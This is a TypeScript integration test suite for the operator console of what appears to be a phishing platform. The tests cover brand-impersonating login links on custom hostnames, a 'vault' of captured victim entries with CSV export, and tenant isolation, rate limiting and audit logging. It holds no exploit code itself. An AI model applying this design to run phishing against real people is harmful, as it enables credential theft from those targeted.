import { describe, expect, it } from "vitest";
import { admin } from "../../../packages/db/test/helpers";
import {
  BASE,
  activate,
  agent,
  createService,
  PASSWORD,
  seedCapture,
  signUp,
  verify,
  type Agent,
} from "./harness";

const hasDb = Boolean(process.env.DATABASE_URL_TEST);

async function seedBrand(): Promise<string> {
  const row = await admin.query<{ id: string }>(
    `insert into brands (slug, name, email_domains, template_key, login_url)
     values ('test-brand', 'Test Brand', '{test.example}', 'test', 'https://test.example')
     on conflict (slug) do update set name = excluded.name returning id`,
  );
  return row.rows[0]!.id;
}

/** An org root plus one hostname under it; returns the hostname id. */
async function seedHostname(
  orgId: string,
  serviceId: string,
  fqdn: string,
  status = "active",
  token = "tok",
): Promise<{ id: string; verify_token: string }> {
  const root = fqdn.split(".").slice(-2).join(".");
  const domain = await admin.query<{ id: string; verify_token: string }>(
    `insert into org_domains (org_id, root, verify_token, status, verified_at, verified_by)
     values ($1, $2, $3, 'active', now(), 'txt')
     on conflict (org_id, root) do update set root = excluded.root returning id, verify_token`,
    [orgId, root, token],
  );
  const row = await admin.query<{ id: string; verify_token: string }>(
    `insert into hostnames (org_id, domain_id, service_id, fqdn, label, verify_token, status, verified_at)
     values ($1, $2, $3, $4, $5, $6, $7, case when $7 = 'active' then now() end)
     returning id, verify_token`,
    [orgId, domain.rows[0]!.id, serviceId, fqdn, fqdn.split(".")[0], token, status],
  );
  return row.rows[0]!;
}

async function ready() {
  const who = await signUp();
  await verify(who.jar, who.email);
  const serviceId = await createService(who.jar);
  const res = await activate(who.jar, serviceId);
  expect(res.status).toBe(303);
  return { who, serviceId };
}

function jsonPost(jar: Agent, path: string, body: unknown): Promise<Response> {
  return fetch(`${BASE}${path}`, {
    method: "POST",
    headers: {
      cookie: jar.cookies.join("; "),
      "content-type": "application/json",
    },
    body: JSON.stringify(body),
    redirect: "manual",
  });
}

describe.skipIf(!hasDb)("console", () => {
  it("serves the overview with the org and the service", async () => {
    const { who } = await ready();
    const page = await who.jar.get("/dashboard");
    expect(page.status).toBe(200);
    const body = await page.text();
    expect(body).toContain("Welcome back");
    expect(body).toContain("Acme");
    expect(body).toContain("New service");
  });

  it("lists a capture in the vault and exports it as CSV", async () => {
    const { who, serviceId } = await ready();
    await seedCapture(who.orgId, serviceId);

    const page = await who.jar.get("/vault");
    expect(page.status).toBe(200);
    expect(await page.text()).toContain("victim@x.test");

    const csv = await who.jar.get("/api/vault/export");
    expect(csv.status).toBe(200);
    expect(csv.headers.get("content-type")).toContain("text/csv");
    expect(await csv.text()).toContain("victim@x.test");
  });

  it("keeps another org out of the vault", async () => {
    const { who, serviceId } = await ready();
    await seedCapture(who.orgId, serviceId);
    const other = await signUp(false);

    const page = await other.jar.get("/vault");
    expect(page.status).toBe(200);
    expect(await page.text()).not.toContain("victim@x.test");
  });

  it("mints a link on an active host and revokes it", async () => {
    const { who, serviceId } = await ready();
    const domain = await seedHostname(who.orgId, serviceId, "live.acme.test");
    const brandId = await seedBrand();

    const made = await jsonPost(who.jar, `/api/services/${serviceId}/links`, {
      hostnameId: domain.id,
      brandId,
    });
    expect(made.status).toBe(201);
    const link = (await made.json()) as { id: string; url: string; slug: string };
    expect(link.url).toBe(`https://live.acme.test/${link.slug}`);
    expect(link.slug).toMatch(/^[0-9A-HJ-NP-TV-Z]{5}$/);

    const gone = await jsonPost(who.jar, `/api/links/${link.id}`, {});
    expect(gone.status).toBe(204);
    const listed = await who.jar.get(`/api/services/${serviceId}/links`);
    expect(await listed.json()).toEqual([]);
  });

  it("refuses a link on a host that is not active", async () => {
    const { who, serviceId } = await ready();
    const domain = await seedHostname(
      who.orgId,
      serviceId,
      "pending.acme.test",
      "provisioning",
    );
    const brandId = await seedBrand();
    const made = await jsonPost(who.jar, `/api/services/${serviceId}/links`, {
      hostnameId: domain.id,
      brandId,
    });
    expect(made.status).toBe(409);
    expect(((await made.json()) as { error: string }).error).toBe("hostname_not_active");
  });

  it("re-checks a failed domain instead of 404ing", async () => {
    const { who, serviceId } = await ready();
    const host = await seedHostname(who.orgId, serviceId, "retry.acme.test", "failed");
    const domain = await admin.query<{ id: string }>(
      "select domain_id as id from hostnames where id = $1",
      [host.id],
    );
    await fetch(
      `${BASE.replace("3100", "3199").replace("localhost", "127.0.0.1")}/_txt`,
      {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify({
          name: "_chameleon.acme.test",
          records: [`cameleon-verify=${host.verify_token}`],
        }),
      },
    );

    const checked = await who.jar.post(`/api/domains/${domain.rows[0]!.id}/check`);
    expect(checked.status).toBe(200);
    const row = await admin.query<{ status: string }>(
      "select status from org_domains where id = $1",
      [domain.rows[0]!.id],
    );
    expect(["verifying", "routing_waiting", "active"]).toContain(row.rows[0]?.status);
  });

  it("writes an audit row for an operator status change", async () => {
    const { who, serviceId } = await ready();
    await admin.query("update users set is_admin = true where id = $1", [who.userId]);
    const res = await jsonPost(who.jar, `/api/admin/services/${serviceId}/status`, {
      status: "suspended",
    });
    expect(res.status).toBe(204);
    const audit = await admin.query<{ action: string; target_id: string }>(
      "select action, target_id from audit_log order by id desc limit 1",
    );
    expect(audit.rows[0]).toEqual({ action: "service.status", target_id: serviceId });
  });

  it("reports mail backlog on health", async () => {
    const res = await fetch(`${BASE}/api/health`);
    expect(res.status).toBe(200);
    const body = (await res.json()) as { ok: boolean; mail: { queued: number } };
    expect(body.ok).toBe(true);
    expect(typeof body.mail.queued).toBe("number");
  });

  it("rate-limits repeated bad logins", async () => {
    const { who } = await ready();
    const jar = agent();
    let last: Response | null = null;
    for (let attempt = 0; attempt < 11; attempt += 1) {
      last = await jar.post("/api/login", { email: who.email, password: `${PASSWORD}x` });
    }
    expect(last?.headers.get("location")).toContain("error=rate_limited");
  });

  it("renders the configuration pages and guards tenants", async () => {
    const { who } = await ready();
    for (const path of [
      "/settings",
      "/settings/domains",
      "/settings/forwarding",
      "/account",
    ]) {
      const res = await who.jar.get(path);
      expect(res.status, path).toBe(200);
    }
    const anon = await agent().get("/services");
    expect(anon.status).toBe(307);
    expect(anon.headers.get("location")).toContain("/login");
  });
});
